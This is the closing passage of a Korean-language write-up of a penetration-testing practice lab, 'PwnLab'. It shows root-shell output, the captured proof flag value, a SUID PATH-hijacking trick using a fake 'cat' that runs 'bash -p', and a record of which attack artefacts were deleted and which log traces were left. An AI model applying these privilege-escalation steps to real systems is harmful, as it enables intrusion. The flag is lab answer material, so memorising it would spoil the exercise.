lrwxrwxrwx  1 root root    9 Mar 17  2016 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
----------  1 root root   32 Jul 13  2020 flag.txt
lrwxrwxrwx  1 root root    9 Mar 17  2016 messages.txt -> /dev/null
lrwxrwxrwx  1 root root    9 Mar 17  2016 .mysql_history -> /dev/null
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root   33 Aug 20 04:23 proof.txt
```

`ls -la /root` 가 세 가지를 한꺼번에 보여줌 — `flag.txt` 는 모드 `----------`(000)의 미끼, `proof.txt` 가 진짜, 그리고 `messages.txt`·`.bash_history`·`.mysql_history` 가 전부 `/dev/null` 심볼릭 링크라 `msg2root` 로 넣은 `hi` 도 root 명령 이력도 아무 데도 안 남음.

⚠️ 그런데 같은 줄 끝의 `cat /root/proof.txt` 출력이 없음. 원인은 `msgmike` PATH 하이재킹에 쓴 `PATH=/tmp/.pth:$PATH` 가 mike → msg2root → root 3단계 셸까지 그대로 상속돼 `cat` 이 가짜 `cat`(`exec /bin/bash -p`)으로 해석된 것. PATH 를 표준값으로 복원한 뒤 정상 출력됨:

```text
root@pwnlab:/tmp# echo "PATH=$PATH"; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ---; cat /root/flag.txt
PATH=/tmp/.pth:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
root
uid=0(root) gid=0(root) groups=0(root),1003(kane)
pwnlab
192.168.248.29 
Thu Aug 20 04:45:59 EDT 2026
540256bedfbf87d15d54425649220e30
---
Your flag is in another file...
```
— 출처: `~/PG/PwnLab/try4_fakecat_shadowed_PATH.log`·`~/PG/PwnLab/shell_www-data.log`. 두 로그 모두 `tmux send-keys` 의 입력 에코가 80열에서 겹쳐 찍힌 상태라, 위 블록은 겹친 잔상만 걷어내고 명령·출력은 원문 그대로임(에코 없는 재캡처는 `stty cols 200` 이후의 `proof_root.txt`).

배제한 대안 경로 — `msg2root` 를 못 찾았다면 다음 후보는 SUID `/usr/sbin/exim4` 였으나 root 획득 후 버전을 재보니 이미 패치된 쪽이었음:

```text
root@pwnlab:/tmp# dpkg -l exim4-daemon-light exim4-base 2>/dev/null | tail -4; exim4 --version 2>&1 | head -2
||/ Name               Version      Architecture Description
+++-==================-============-============-============================================
ii  exim4-base         4.84.2-1     i386         support files for all Exim MTA (v4) packages
ii  exim4-daemon-light 4.84.2-1     i386         lightweight Exim MTA (v4) daemon
Exim version 4.84_2 #2 built 13-Mar-2016 22:18:29
```
— 출처: `~/PG/PwnLab/shell_www-data.log`. `4.84.2-1` 은 Debian 이 로컬 권한상승 수정을 백포트해 넣은 리비전이라 그 경로는 아니었을 것으로 봄 `[가정]` — **익스플로잇을 실제로 시도하지는 않았으므로 배제가 아니라 미검증이다.** 그 다음 후보는 커널 3.16(2016년 빌드) 로컬 익스플로잇이었을 것.

### Post-Exploitation

**Proof.txt value:**
`540256bedfbf87d15d54425649220e30`

증거(플래그 값 원문): `~/PG/PwnLab/proof_user.txt`(1333B, kane 셸) · `~/PG/PwnLab/proof_root.txt`(2925B, root 셸) — 각각 `whoami; id; hostname; hostname -I; date; cat <플래그>` 한 화면 출력이고, 끝에 `kane@pwnlab:/tmp$` · `root@pwnlab:/tmp#` 프롬프트가 붙어 있어 **대화형 셸에서 읽은 값**임이 그 자체로 드러남(웹셸 판정 회피). `/root` 안의 파일 모드·심볼릭 링크는 위 `ls -la /root` 블록에 있음.

**남긴 흔적**

확인한 것 — `rm` 실행과 이후 `ls -la /tmp` 로 전부 삭제 확인(`~/PG/PwnLab/proof_root.txt`·`~/PG/PwnLab/shell_www-data.log`):
- 업로드 파일 `/tmp/63f0276ffd69eb424bf6093795ac9850.gif`(= `/var/www/html/upload/...`)
- harvest 스크립트와 출력 `/tmp/h.sh`, `/tmp/.h/`
- PATH 하이재킹 디렉터리 `/tmp/.pth/cat`
- 리버스셸 FIFO `/tmp/f`
- RFI 테스트 파일 `/tmp/rfitest.php`
- 최종 `/tmp` 는 부팅 시 상태(`.ICE-unix` 등 systemd 디렉터리 + `vmware-root`)만 남았고, `/var/www/html` 은 원본 6개 항목 그대로다. 소스 파일은 하나도 수정하지 않았다.

확인했지만 지우지 않은 것 (지우는 것이 더 많은 흔적을 남긴다):
- `/var/log/auth.log` 에 su 체인이 그대로 남음(`www-data:kent` → `kent:kane`, `~/PG/PwnLab/traces_confirmed.log`)
- `/var/log/apache2/access.log` 에 192.168.45.207 발 요청 58건(LFI·업로드·리버스셸 트리거·nmap NSE 포함)
- `wtmp` 에는 흔적 없음 — `last -n 5` 는 2020년 콘솔 로그인과 2024년 부팅만 표시. `su` 는 wtmp 에 기록하지 않고 SSH 로그인도 없었음. **`last` 만 보고 "흔적 없음"으로 결론 내면 틀린다** — 같은 시각 `auth.log` 에는 su 체인이 전부 남아 있다
- `.bash_history` 는 root/mike/john 것이 원래 `/dev/null` 링크이거나 0바이트고, kent/kane 것도 0바이트(비대화형이라 새로 쓰이지 않음)

확인하지 않은 것: MySQL 서버 로그(일반 쿼리 로그 활성 여부 미확인), `/var/log/syslog`.

Kali 쪽 — tmux `pwnlab_nmap`·`pwnlab_http`·`pwnlab_xfer`·`pwnlab_xfer2` 종료, 8000/4445/4446/9099 리스너 정리 확인. `~/PG/_lib/` 에 임시로 뒀던 `rfitest.php`/`rfitest.txt` 삭제. `harvest.sh` 자체는 수정하지 않음. `~/suidtest/`·`/tmp/suidtest*`(root 소유 SUID 검증용) 삭제 확인.

## 관련

- `php://filter` 래퍼 — PHP 매뉴얼 `filters.convert.base64-encode`
- GTFOBins — PATH 하이재킹 일반론 및 `bash -p` 동작
- 산출물 전량: Kali `~/PG/PwnLab/`
- [[_PLAYBOOK#A-1-10. tmux 에 던진 스캔이 «조용히» 죽는다]] · [[_PLAYBOOK#A-24. 한 서비스의 거부는 자격증명의 오류가 아니다]] · [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] · [[_PLAYBOOK#B-1-20. 검증하는 파서 ≠ 처리하는 파서 — 업로드 필터는 그 틈으로 넘는다]] · [[_PLAYBOOK#B-32. SUID 바이너리 명령주입 — 문자 필터는 `$()` 로 넘는다]] · [[_PLAYBOOK#B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)]]
- [[_PLAYBOOK#A-3-12. `event not found` — 히스토리 확장이 `!` 를 먹고 «줄 전체»를 폐기한다]] · [[_PLAYBOOK#A-4-13. root 는 잡았는데 `cat` 이 «조용히» 아무것도 안 뱉는다 — 오염된 PATH 가 상속됨]] · [[_PLAYBOOK#B-1-38. LFI 진입점이 한 앱에 «두 개» 있을 수 있다 — 하나는 소스 전용, 하나는 실행 가능]] · [[_PLAYBOOK#B-3-12. SUID 가 절대경로 없이 외부 명령을 부르면 PATH 하이재킹이 된다]] · [[_PLAYBOOK#A-25. 그럴듯한 로그인 폼이 미끼일 수 있다]]
- 비밀번호 재사용 패턴 · SUID 상대경로 PATH 하이재킹은 다른 리눅스 박스에서도 반복됨 — [[Robust]](DB→OS 크리덴셜 재사용)
